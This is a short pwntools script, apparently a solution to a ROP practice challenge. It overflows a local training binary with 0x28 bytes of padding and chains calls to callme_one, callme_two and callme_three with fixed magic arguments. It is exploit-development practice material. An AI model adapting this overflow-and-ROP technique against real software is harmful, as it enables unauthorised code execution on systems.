from pwn import *

exe = ELF("./callme_patched")
libc = ELF("./libcallme.so")

context.binary = exe

gdbscript = """
set follow-fork-mode child
"""

VALUE1 = 0xDEADBEEFDEADBEEF
VALUE2 = 0xCAFEBABECAFEBABE
VALUE3 = 0xD00DF00DD00DF00D

def conn():
    return process([exe.path])

def exploit(r):
    rop = ROP(exe)

    rop.call("callme_one", [VALUE1, VALUE2, VALUE3])
    rop.call("callme_two", [VALUE1, VALUE2, VALUE3])
    rop.call("callme_three", [VALUE1, VALUE2, VALUE3])

    r.sendline(b"a" * 0x28 + rop.chain())
    
def main():
    r = conn()
    exploit(r)
    r.interactive()

if __name__ == "__main__":
    main()
